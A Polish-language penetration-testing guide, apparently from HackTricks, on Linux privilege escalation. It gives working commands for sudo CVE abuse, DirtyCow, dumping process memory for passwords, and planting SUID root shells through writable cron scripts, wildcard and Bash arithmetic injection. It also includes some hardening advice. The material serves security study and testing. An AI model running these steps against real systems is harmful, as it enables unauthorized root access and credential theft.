# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

Aby uzyskać szersze tło i poznać historyczne metody enumeracji, porównaj zasoby g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation i linux-private-i wymienione w odnośnikach.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zebrania informacji o uruchomionym systemie operacyjnym.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze zdefiniowanym w zmiennej `PATH`**, możesz przejąć niektóre biblioteki lub pliki binarne:

```bash
echo $PATH
```

### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?

```bash
(env || set) 2>/dev/null
```

### Exploity jądra

Sprawdź wersję jądra i czy istnieje exploit, którego można użyć do eskalacji uprawnień.

Sekcja [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) zawiera przypadki lokalnej eskalacji uprawnień oraz odnośniki do bardziej szczegółowych opracowań dotyczących jądra Linux w Binary Exploitation. Przed przetestowaniem danego przypadku sprawdź, czy dotyczy on używanej kompilacji i konfiguracji.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Możesz znaleźć dobrą listę podatnych wersji jądra i kilka **skompilowanych exploitów** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [sploity z exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Inne strony, na których znajdziesz **skompilowane exploity**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony, możesz wykonać:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Narzędzia, które mogą pomóc w wyszukiwaniu exploitów na kernel:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom NA ofierze, sprawdza exploity tylko dla kernela 2.x)

Zawsze **wyszukaj wersję kernela w Google**. Może się okazać, że Twoja wersja kernela jest wymieniona w opisie exploita — wtedy będziesz mieć pewność, że exploit zadziała.

Dodatkowe techniki wykorzystania luk w kernelu:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w Linuksie — Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Wersja sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:

```bash
searchsploit sudo
```

Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 do 1.9.17** umożliwia nieuprzywilejowanym użytkownikom lokalnym eskalację uprawnień do roota za pomocą opcji `--chroot`, gdy sudo wczytuje `/etc/nsswitch.conf` z katalogu kontrolowanego przez użytkownika; upstream naprawił to w wersji **1.9.17p1**. Sprawdź wszystkie pliki binarne sudo z root-setuid w odpowiednich ścieżkach, ponieważ `sudo -V` raportuje tylko plik binarny wybrany przez `PATH`. Pakiety dystrybucji mogą zawierać poprawkę bez zmiany numeru wersji upstream, dlatego sprawdź również status pakietu dostawcy. Zobacz [komunikat opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Oto [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) umożliwiający wykorzystanie tej [luki](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że Twoja wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [komunikacie o luce](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Obejście reguł sudo opartych na hoście (CVE-2025-32462)

Upstream sudo **1.8.8 do 1.9.17** może oceniać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** za pomocą `sudo -h <host>`, zamiast **rzeczywistej nazwy hosta**; upstream naprawił to w wersji **1.9.17p1**. Użytkownik nadal musi mieć pasujący wpis sudoers na wybranym hoście. Sprawdź poprawki wsteczne dostawcy oraz alternatywne pliki binarne sudo, a także lokalną politykę. Zobacz [komunikat opiekuna sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Wymagania:
- Podatna wersja sudo
- Reguły sudoers specyficzne dla hosta (host nie jest bieżącą nazwą hosta ani `ALL`)

Przykładowy wzorzec sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit przez spoofing dozwolonego hosta:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Jeśli rozwiązywanie wybranej nazwy uniemożliwia działanie, sprawdź, jak ta nazwa jest rozwiązywana na hoście. Samo znalezienie nazwy w logu lub pliku konfiguracyjnym nie oznacza, że można ją rozwiązać, a modyfikacja `/etc/hosts` zwykle wymaga uprzywilejowanego dostępu do zapisu.

#### sudo < v1.8.28

Ten [upstreamowy bypass Runas UID](https://ubuntu.com/security/CVE-2019-14287) wymaga obowiązującej reguły sudo, która zezwala na wykonanie polecenia jako dowolny użytkownik z wyjątkiem roota, na przykład `(ALL, !root) /bin/bash`. Wywołujący musi również mieć prawo do użycia tej reguły, w tym spełnić ewentualny wymóg uwierzytelnienia. Sprawdź komunikat bezpieczeństwa dotyczący zainstalowanego pakietu: dostawcy przenieśli poprawkę do wydań, których wyświetlana wersja upstream nadal jest niższa niż 1.8.28. Sama reguła `!root` lub stara wersja nie potwierdza podatności. Nie testuj uprzywilejowanego polecenia podczas pasywnego rozpoznania.

```
sudo -u#-1 /bin/bash
```

### Weryfikacja podpisu dmesg nie powiodła się

Sprawdź **maszynę smasher2 z HTB**, aby zobaczyć **przykład** wykorzystania tej podatności.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Dalsza enumeracja systemu

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Wylicz możliwe zabezpieczenia

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Jeśli znajdujesz się wewnątrz kontenera, zacznij od sekcji dotyczącej bezpieczeństwa kontenerów, a następnie przejdź do stron opisujących nadużycia specyficzne dla danego środowiska uruchomieniowego:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź, **co jest zamontowane, a co odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy nie zawiera prywatnych informacji.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Przydatne oprogramowanie

Wylicz przydatne pliki binarne

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Sprawdź również, czy zainstalowano **jakikolwiek kompilator**. Przyda się to, jeśli trzeba będzie użyć exploita jądra, ponieważ zaleca się skompilowanie go na maszynie, na której będzie używany (lub podobnej).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Zainstalowane podatne oprogramowanie

Sprawdź **wersje zainstalowanych pakietów i usług**. Być może zainstalowano starą wersję Nagiosa (na przykład), którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić, czy zainstalowane na niej oprogramowanie jest nieaktualne lub podatne na ataki.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą mnóstwo informacji, z których większość będzie bezużyteczna. Dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, **jakie procesy** są uruchomione i czy któryś z nich ma **większe uprawnienia, niż powinien** (może tomcat jest uruchomiony jako root?).

```bash
ps aux
ps -ef
top -n 1
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — możesz je wykorzystać do podniesienia uprawnień](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
**Sprawdź też, czy masz uprawnienia do plików binarnych procesów** — może uda Ci się nadpisać któryś z nich.

### Łańcuchy procesów nadrzędnych i podrzędnych między użytkownikami

Proces podrzędny działający jako **inny użytkownik** niż jego proces nadrzędny nie jest automatycznie złośliwy, ale stanowi przydatny **sygnał do wstępnej analizy**. Niektóre przejścia są oczekiwane (`root` uruchamiający usługę jako użytkownik usługi, menedżery logowania tworzące procesy sesji), ale nietypowe łańcuchy mogą ujawniać wrappery, pomocnicze procesy debugowania, mechanizmy utrzymywania dostępu lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego i wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc sam proces potomny nie był zapisywalny, ale **konfiguracja kontrolowana przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i pliki otwarte po usunięciu

Artefakty środowiska uruchomieniowego są często nadal dostępne **po usunięciu**. Jest to przydatne zarówno do eskalacji uprawnień, jak i do odzyskiwania dowodów z procesu, który ma już otwarte wrażliwe pliki.

Sprawdź usunięte pliki wykonywalne:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To mocny sygnał, który warto zbadać, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- działający proces może nadal udostępniać przydatne deskryptory plików
- usunięty plik binarny z uprawnieniami może wskazywać na niedawne manipulacje lub próbę zatarcia śladów

Zbierz globalnie otwarte pliki oznaczone jako usunięte:

```bash
lsof +L1
```

Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Jest to szczególnie przydatne, gdy proces nadal ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik z flagą.

### Monitorowanie procesów

Możesz używać narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikowania podatnych procesów, które są często uruchamiane lub uruchamiają się po spełnieniu określonego zestawu warunków.

#### Linux ProcMon z sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) może śledzić wybrane procesy i wywołania systemowe oraz zapisywać ślad w bazie SQLite. Jeśli `sudo -l` zezwala na nieograniczone uruchamianie polecenia `procmon` z uprawnieniami roota, sprawdź, czy mogłoby ono obserwować dane wejściowe lub wyjściowe procesu innego użytkownika. To uprawnienie jest jedynie wskazówką do dalszej analizy: znaczenie mają również obsługa śledzenia, obowiązująca polityka oraz aktywność odpowiedniego procesu. Pliki śladów mogą zawierać sekrety, dlatego dokładnie sprawdzaj autoryzowane eksporty i unikaj zbierania danych o niepowiązanych procesach.

### Pamięć procesu

Niektóre usługi serwera przechowują **poświadczenia w postaci jawnego tekstu w pamięci**.\
Zazwyczaj do odczytu pamięci procesów należących do innych użytkowników potrzebne są **uprawnienia roota**, dlatego jest to zwykle przydatniejsze, gdy masz już roota i chcesz znaleźć więcej poświadczeń.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytywać pamięć własnych procesów**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie można zrzucać pamięci innych procesów należących do nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam UID. Tak działało ptrace w klasycznym wariancie.
> - **kernel.yama.ptrace_scope = 1**: debugować można tylko procesy potomne.
> - **kernel.yama.ptrace_scope = 2**: z ptrace może korzystać tylko administrator, ponieważ wymaga ono możliwości CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żaden proces nie może być śledzony przez ptrace. Po ustawieniu tej wartości ponowne uruchomienie systemu jest konieczne, aby znów włączyć ptrace.

Proces o tym samym UID, który na krótko odblokowuje sejf z hasłami, może stanowić odrębną granicę bezpieczeństwa poświadczeń. Gdy śledzenie jest dozwolone, aktywny proces z możliwością zrzucania pamięci może ujawnić hasło do sejfu przez swoje wywołania systemowe dotyczące danych wejściowych lub pamięć, nawet jeśli sam zaszyfrowany plik sejfu pozostaje chroniony. `ptrace_scope=0` to tylko jeden z warunków wstępnych: znaczenie mają również zgodność poświadczeń, możliwość zrzucania pamięci procesu docelowego, inne moduły bezpieczeństwa Linuksa oraz czas życia procesu. Wykorzystanie wpisu z sejfu do logowania na konto root w systemie Unix wymaga osobnego sprawdzenia możliwości ponownego użycia poświadczeń. Rutynowe rozpoznanie powinno wskazywać politykę oraz potencjalne procesy lub ścieżki do sejfów, a nie przechwytywać dane wejściowe ani wyświetlać sekretów. Zobacz [dokumentację Yama w jądrze](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) i [kontrole dostępu ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz pobrać stertę i przeszukać ją pod kątem poświadczeń.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Skrypt GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje, jak pamięć jest mapowana w przestrzeni adresowej wirtualnej tego procesu**; pokazuje też **uprawnienia każdego mapowanego obszaru**. Pseudoplik **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **obszary pamięci można odczytać** oraz jakie są ich przesunięcia. Korzystamy z tych informacji, aby **przejść do odpowiednich pozycji w pliku mem i zrzucić wszystkie obszary, które można odczytać**, do pliku.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie do pamięci wirtualnej. Przestrzeń adresową jądra można uzyskać za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` może odczytywać tylko **root** i grupa **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump dla systemu Linux

ProcDump to linuxowa reinterpretacja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla systemu Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące roota i zrzucić pamięć procesu, którego jesteś właścicielem
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz działający proces authenticator:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Możesz zrzucić pamięć procesu (zobacz wcześniejsze sekcje, aby poznać różne sposoby zrzucania pamięci procesu) i wyszukać w niej poświadczenia:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **wykrada poświadczenia w postaci jawnego tekstu z pamięci** i z niektórych **dobrze znanych plików**. Do prawidłowego działania wymaga uprawnień root.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH — użycie Sudo)         | sshd:                |

#### Wyszukiwanie wyrażeń regularnych/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Zadania Cron

### Crontab UI (alseambusher) działający jako root – privesc przez scheduler oparty na WWW

Jeśli panel WWW „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest dostępny tylko przez loopback, nadal możesz uzyskać do niego dostęp przez lokalne przekierowanie portu SSH i utworzyć uprzywilejowane zadanie, aby eskalować uprawnienia.<sup>[[1]](#references)[[4]](#references)</sup>

Typowy ciąg działań
- Wykryj port dostępny tylko przez loopback (np. 127.0.0.1:8000) i realm Basic-Auth przez `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane logowania w artefaktach operacyjnych:
  - Kopie zapasowe/skrypty z `zip -P <password>`
  - Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (tworzy powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```

Utwardzanie
- Nie uruchamiaj Crontab UI jako root; użyj dedykowanego użytkownika i minimalnych uprawnień
- Powiąż z localhost i dodatkowo ogranicz dostęp za pomocą firewalla/VPN; nie używaj ponownie haseł
- Unikaj umieszczania sekretów w plikach jednostek; używaj magazynów sekretów lub plików EnvironmentFile dostępnych tylko dla roota
- Włącz audytowanie/logowanie uruchomień zadań na żądanie

Sprawdź, czy jakieś zaplanowane zadanie jest podatne na ataki. Może uda ci się wykorzystać skrypt uruchamiany przez roota (wildcard vuln? Możesz modyfikować pliki używane przez roota? Użyć symlinków? Utworzyć konkretne pliki w katalogu używanym przez roota?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Jeśli używane jest `run-parts`, sprawdź, które nazwy zostaną faktycznie uruchomione:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

This pozwala uniknąć fałszywych alarmów. Zapisywalny katalog używany cyklicznie jest przydatny tylko wtedy, gdy nazwa pliku payloadu spełnia lokalne reguły `run-parts`.

### Ścieżka Cron

Na przykład w pliku _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik „user” ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać polecenie lub skrypt bez ustawiania ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota za pomocą:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron uruchamiający skrypt z symbolem wieloznacznym (Wildcard Injection)

Jeśli skrypt wykonywany przez root zawiera „**\***” w poleceniu, możesz to wykorzystać, aby wywołać nieoczekiwane działania (np. privesc). Przykład:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Jeśli przed wildcardem znajduje się ścieżka, np.** _**/some/path/\***_ **, nie jest podatny na atak (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać inne triki związane z wykorzystaniem wildcardów:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Wstrzyknięcie w rozwinięciu arytmetycznym Bash w parserach logów cron

Bash może interpretować niezaufany tekst jako wyrażenie arytmetyczne. W niektórych kontekstach Bash indeks tablicy w takim wyrażeniu może spowodować ewaluację podstawienia polecenia. Jeśli uprzywilejowany cron lub parser umieści kontrolowany przez atakującego tekst z logów w takim porównaniu arytmetycznym, podstawienie może zostać wykonane z uprawnieniami parsera.<sup>[[22]](#references)</sup> Zależy to od konkretnego wyrażenia Bash i jego wersji; sam ciąg `$(...)0` w rozwiniętej zmiennej nie jest wiarygodnym przykładem ponownej ewaluacji.

Dane wejściowe mogą też pochodzić z metadanych pliku lub innego pola odczytywanego z lokalizacji, do której użytkownik ma prawo zapisu. Na przykład uprzywilejowany skrypt czyszczący, który odczytuje tag `Producer` obrazu i porównuje go za pomocą `[[ "$producer" -eq "expected" ]]`, wykonuje porównanie arytmetyczne, mimo że zmienna jest ujęta w cudzysłowy. Sprawdź, z jaką tożsamością uruchamiane jest zadanie, które pliki mogą dostarczyć ten tag, jakie przekształcenia są wykonywane przed porównaniem oraz jakie dokładnie jest zachowanie Bash. W przypadku etykiet tekstowych używaj porównania ciągów znaków; w przypadku liczb przed wykonaniem działań arytmetycznych sprawdź, czy dane wejściowe zawierają wyłącznie cyfry dziesiętne. Zobacz [reguły arytmetyczne Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Typowy podatny wzorzec:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Bezpieczne lokalne sprawdzenie zachowania mechanizmu indeksowania tablic (bez procesu uprzywilejowanego ani zmian plików):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Prześledź faktycznie uruchamiany skrypt zaplanowanego zadania oraz literalną ścieżkę wejściową, którą otwiera. Nawet jeśli plik dziennika nie jest zapisywalny, użytkownik, który może zapisywać w jego katalogu nadrzędnym bez sticky bitu i przechodzić przez niego, może być w stanie podmienić wpis katalogowy; `namei -l` pomaga odróżnić te uprawnienia. Inna zapisywalna ścieżka dziennika, nieczytelny scheduler ani parser, który nigdy nie interpretuje tego pola jako arytmetyki Bash, nie potwierdzają tej ścieżki.

### Nadpisywanie skryptu cron i symlink

Jeśli **możesz modyfikować skrypt cron** uruchamiany przez roota, możesz bardzo łatwo uzyskać shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Jeśli skrypt wykonywany przez roota korzysta z **katalogu, do którego masz pełny dostęp**, przydatne może być usunięcie tego folderu i **utworzenie w jego miejscu dowiązania symbolicznego do innego katalogu** zawierającego kontrolowany przez Ciebie skrypt.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Weryfikacja symlinków i bezpieczniejsza obsługa plików

Podczas analizowania uprzywilejowanych skryptów/binarnych plików, które odczytują lub zapisują pliki na podstawie ścieżek, sprawdź, jak obsługiwane są linki:

- `stat()` podąża za symlinkiem i zwraca metadane celu.
- `lstat()` zwraca metadane samego linku.
- `readlink -f` i `namei -l` pomagają ustalić ścieżkę do docelowego pliku i pokazują uprawnienia każdego elementu ścieżki.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Dla obrońców/deweloperów bezpieczniejsze sposoby ochrony przed sztuczkami z symlinkami obejmują:

- `O_EXCL` z `O_CREAT`: przerwij, jeśli ścieżka już istnieje (blokuje wcześniej utworzone przez atakującego linki/pliki).
- `openat()`: działaj względem zaufanego deskryptora pliku katalogu.
- `mkstemp()`: twórz pliki tymczasowe atomowo, z bezpiecznymi uprawnieniami.

### Niestandardowo podpisane binaria cron z zapisywalnymi payloadami
Zwykły użytkownik, który może zapisywać dokładnie to binarium uruchamiane przez zadanie cron roota, może przekroczyć granicę uprawnień, ale niestandardowa weryfikacja podpisu może odrzucić niepodpisaną podmianę. W udokumentowanym przypadku plik ELF należący do roota miał tryb `0760`, co pozwalało członkowi jego grupy zapisywać go, a właścicielowi będącemu rootem — uruchamiać. Widoczny ślad procesów pokazywał, że `objcopy` wyodrębniał `.text_sig` przed uruchomieniem binarium przez zadanie cron; pełny skrypt weryfikujący nie był czytelny.<sup>[[2]](#references)</sup>

